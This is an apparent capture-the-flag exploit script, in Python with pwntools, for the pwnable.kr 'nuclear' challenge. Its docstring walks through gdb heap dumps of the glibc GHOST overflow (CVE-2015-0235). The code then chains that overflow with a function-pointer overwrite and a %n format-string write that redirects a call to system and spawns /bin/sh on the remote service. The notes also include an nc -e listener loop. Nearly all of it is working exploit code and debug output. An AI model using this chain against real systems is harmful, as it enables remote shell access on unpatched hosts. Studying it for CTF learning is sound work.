from pwn import *


'''
    checksec --file nuclear
        RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
        Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   nuclear


    note:
            http://libcdb.com/search?symbolA=__libc_start_main&addressA=0xf7e513e0&symbolB=setsockopt&addressB=0xf7f246d0

            
            libc info:
                Operating System:
                    Ubuntu Linux
                type:
                    ELF
                architecture:
                    x86
                download:
                    libc-2.15_1.so


    run:
        export LD_PRELOAD=/root/Desktop/nuclear/x86_64_libc.so.6 
        while true;do nc -vv -l -p 9013 -e ./nuclear;killall -s 9 nuclear;done


    reference:
        http://www.openwall.com/lists/oss-security/2015/01/27/9
        
    poc:
        0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010



    gdb debug:
        gdb -p `pidof nuclear`

        set follow-fork-mode parent
        set follow-exec-mode same
        b *0x400C24
        b *0x400C35
        b *0x400CD5
        b *0x400D17
        b *0x4009E8
        b *0x400AAD
        b *0x400A05
        b *0x400A0A
        
        shell cat /proc/`pidof nuclear`/maps

        gdb$ shell cat /proc/`pidof nuclear`/maps
        00400000-00402000 r-xp 00000000 08:01 1732009                            /root/Desktop/nuclear/nuclear
        00601000-00602000 r--p 00001000 08:01 1732009                            /root/Desktop/nuclear/nuclear
        00602000-00603000 rw-p 00002000 08:01 1732009                            /root/Desktop/nuclear/nuclear
        00603000-00624000 rw-p 00000000 00:00 0                                  [heap]
        7ffff7a1d000-7ffff7bd2000 r-xp 00000000 08:01 1732014                    /root/Desktop/nuclear/x86_64_libc.so.6
        7ffff7bd2000-7ffff7dd2000 ---p 001b5000 08:01 1732014                    /root/Desktop/nuclear/x86_64_libc.so.6
        7ffff7dd2000-7ffff7dd6000 r--p 001b5000 08:01 1732014                    /root/Desktop/nuclear/x86_64_libc.so.6
        7ffff7dd6000-7ffff7dd8000 rw-p 001b9000 08:01 1732014                    /root/Desktop/nuclear/x86_64_libc.so.6
        7ffff7dd8000-7ffff7ddd000 rw-p 00000000 00:00 0 
        7ffff7ddd000-7ffff7dfd000 r-xp 00000000 08:01 538943                     /lib/x86_64-linux-gnu/ld-2.13.so
        7ffff7ff4000-7ffff7ffa000 rw-p 00000000 00:00 0 
        7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
        7ffff7ffc000-7ffff7ffd000 r--p 0001f000 08:01 538943                     /lib/x86_64-linux-gnu/ld-2.13.so
        7ffff7ffd000-7ffff7ffe000 rw-p 00020000 08:01 538943                     /lib/x86_64-linux-gnu/ld-2.13.so
        7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 
        7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
        ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]


        x/50xg 0x00603000


        @step1:  mallco 3 chunks

            chunk_1 = g_buf = (char *)malloc(0x404uLL);
            x/8xg 0x603000
            0x603000:   0x0000000000000000  0x0000000000000411
            0x603010:   0x0000000000000000  0x0000000000000000
            0x603020:   0x0000000000000000  0x0000000000000000
            0x603030:   0x0000000000000000  0x0000000000000000


            chunk_2 = g_buf2 = malloc(0x3E8uLL);  
            x/8xg 0x603410
            0x603410:   0x0000000000000000  0x00000000000003f1
            0x603420:   0x0000000000000000  0x0000000000000000
            0x603430:   0x0000000000000000  0x0000000000000000
            0x603440:   0x0000000000000000  0x0000000000000000


            chunk_3 = func_obj = malloc(0x18uLL);
            x/8xg 0x603800
            0x603800:   0x0000000000000000  0x0000000000000021
            0x603810:   0x00000000004009b4  0x0000000000400a5b
            0x603820:   0x0000000000000000  0x00000000000207e1      <==  last chunk
            0x603830:   0x0000000000000000  0x0000000000000000


            last chunk:
            x/8xg 0x603820
            0x603820:   0x0000000000000000  0x00000000000207e1
            0x603830:   0x0000000000000000  0x0000000000000000
            0x603840:   0x0000000000000000  0x0000000000000000
            0x603850:   0x0000000000000000  0x0000000000000000            



        @step2:  free chunk_1
            chunk_1 = g_buf = (char *)malloc(0x404uLL);
            x/8xg 0x603000
            0x603000:   0x0000000000000000  0x0000000000000411
            0x603010:   0x0000000000000000  0x0000000000000000
            0x603020:   0x0000000000000000  0x0000000000000000
            0x603030:   0x0000000000000000  0x0000000000000000


            chunk_2 = g_buf2 = malloc(0x3E8uLL);  
            x/8xg 0x603410
            0x603410:   0x0000000000000000  0x00000000000003f1
            0x603420:   0x00007ffff7dd8eb8  0x00007ffff7dd8eb8
            0x603430:   0x0000000000000000  0x0000000000000000
            0x603440:   0x0000000000000000  0x0000000000000000


            chunk_3 = func_obj = malloc(0x18uLL);
            x/8xg 0x603800
            0x603800:   0x00000000000003f0  0x0000000000000020
            0x603810:   0x00000000004009b4  0x0000000000400a5b
            0x603820:   0x00000000004009c9  0x00000000000207e1      <==  last chunk
            0x603830:   0x0000000000000000  0x0000000000000000


            last chunk:
            x/8xg 0x603820
            0x603820:   0x00000000004009c9  0x00000000000207e1
            0x603830:   0x0000000000000000  0x0000000000000000
            0x603840:   0x0000000000000000  0x0000000000000000
            0x603850:   0x0000000000000000  0x0000000000000000          



        @step3:  after gethostbyname_r uses chunk_1 as output buf param3, because of glibc2.15 suffer from cve_2015_0235,
                so chunk_1 will will overflow 4 bytes which will overwrite chunk_2's size field!

            chunk_1 = g_buf = (char *)malloc(0x404uLL);
            x/8xg 0x603000
            0x603000:   0x0000000000000000  0x0000000000000411
            0x603010:   0x0000000008000000  0x0000000000000000
            0x603020:   0x0000000000603010  0x0000000000000000
            0x603030:   0x0000000000000000  0x3030303030303030


            chunk_2 = g_buf2 = malloc(0x3E8uLL);  
            x/8xg 0x603410
            0x603410:   0x3030303030303030  0x0000000000003031      <=  chunk_2's size field was overwrite by 0x3031
            0x603420:   0x00007ffff7dd8eb8  0x00007ffff7dd8eb8
            0x603430:   0x0000000000000000  0x0000000000000000
            0x603440:   0x0000000000000000  0x0000000000000000

            chunk2_1: genereate by gethostbyname_r
            x/8xg 0x603650
            0x603650:   0x00007ffff7dd6200  0x00000000000001b1
            0x603660:   0x00007ffff7dd8eb8  0x00007ffff7dd8eb8
            0x603670:   0x0000000000000000  0x0000000000000000
            0x603680:   0x0000000000000000  0x0000000000000000

            chunk_3 = func_obj = malloc(0x18uLL);
            x/8xg 0x603800
            0x603800:   0x00000000000003f0  0x0000000000000020
            0x603810:   0x00000000004009b4  0x0000000000400a5b
            0x603820:   0x00000000004009c9  0x00000000000207e1      <==  last chunk
            0x603830:   0x0000000000000000  0x0000000000000000


            last chunk:
            x/8xg 0x603820
            0x603820:   0x00000000004009c9  0x00000000000207e1
            0x603830:   0x0000000000000000  0x0000000000000000
            0x603840:   0x0000000000000000  0x0000000000000000
            0x603850:   0x0000000000000000  0x0000000000000000      



            normal bins:
            gdb$ x/10xg 0x00007ffff7dd8eb8
            0x7ffff7dd8eb8: 0x0000000000603820  0x0000000000603650
            0x7ffff7dd8ec8: 0x0000000000603410  0x0000000000603410
            0x7ffff7dd8ed8: 0x00007ffff7dd8ec8  0x00007ffff7dd8ec8

'''

def exploit(host):
    io = None
    try:
        #io = process("./ld.nuclear.so --library-path ./ ./nuclear",shell=True)
        io = remote("pwnable.kr", 9013)
        if not io :
            raise Exception
    except:
        print 'can\'t  caonnect server!'
        exit(0)


    def nuke_url(host):
        assert  len(host) <= 2048
        io.recvuntil('>')
        io.sendline('2')
        io.recvuntil('URL! :')
        io.sendline(host)

    
    def send_big_data(msg):
        assert  len(msg) <= 3000
        assert msg != None and msg[0] != 'y'
        scanf_bad_chars = ['\x09','\x0a','\x0b','\x0c','\x0d','\x20']
        for bad in scanf_bad_chars:
            assert  bad not in msg    
        io.recvuntil('>')
        io.sendline('3')
        io.recvuntil('exit?(y/n)')
        io.sendline(msg)

    def bye():
        io.recvuntil('>')
        io.sendline('3')
        io.sendline('y')


    #leak heap base
    def leak_heap():
        pass
    #leak libc base
    def leak_libc():
        pass

    def CVE_2015_0235():
        fake_size = p16(0x3031)
        ghost_size  = 0x400 - 16*1 - 4*2 - 4 - 3
        poc_chunk = '0' * ghost_size + fake_size
        print len(poc_chunk)
        print poc_chunk
        nuke_url(poc_chunk)
        bye()
        io.interact()
        exit(0)

    def getshell():
        # step1: using CVE-2015-0235 to trigger 4 bytes overflow in heap
        fake_size = p16(0x3031)
        ghost_size  = 0x400 - 16*1 - 4*2 - 4*2
        poc_chunk = '0' * ghost_size + fake_size
        print poc_chunk
        print len(poc_chunk)
        raw_input("wait")
        nuke_url(poc_chunk)
        raw_input("before")
        raw_input("before")

        # step2: overwrite nuke function pointer in heap
        printf = 0x400830
        nuke_fn = printf
        payload = 'P'*(0x400-0x08)  + p64(nuke_fn)              # overwrite nuke function
        send_big_data(payload)
        
        # step3: trigger printf format vuln
        def fmt_exolit():
            # step3.1: leak heap info
            nuke_url("%6$p")
            line = io.recvline().strip()
            func_list = int(line[-16:],16)
            heap_base = func_list - 0x810
            help_fn_ptr = func_list
            nuke_fn_ptr = func_list + 0x08
            bye_fn_ptr = func_list + 0x10
            print("[+] heap_base    @   {0}".format(hex(heap_base)))
            print("[+] func_list    @   {0}".format(hex(func_list)))
            print("[+] help_fn_ptr  @   {0}".format(hex(help_fn_ptr)))
            print("[+] nuke_fn_ptr  @   {0}".format(hex(nuke_fn_ptr)))
            print("[+] bye_fn_ptr   @   {0}".format(hex(bye_fn_ptr)))

            # step3.2: overwite function pointer in heap memory
            system = 0x400820
            where = p64(nuke_fn_ptr)
            what  = str(int(system))
            nuke_url( ("%"+(16-2-len(what))*'0'+what+"c") + ("%0000000000012$n") + where )
            print("[+] overwrite nuke_fn_ptr[{0}] as system[{1}]".format(hex(nuke_fn_ptr),hex(system)))

            # step3.3: spawn shell
            print("[*] hold on! it will take some time to send {0} bytes data!".format(what))
            print("[*] waiting for shell......")
            nuke_url("/bin/sh;")
            io.interactive()

        fmt_exolit()
        io.interact()
    


    #CVE_2015_0235()
    getshell()
    


if __name__ == '__main__':
    host  = ('pwnable.kr',9013)     # remote
    #host  = ('127.0.0.1',9013)      # local
    exploit(host)
    

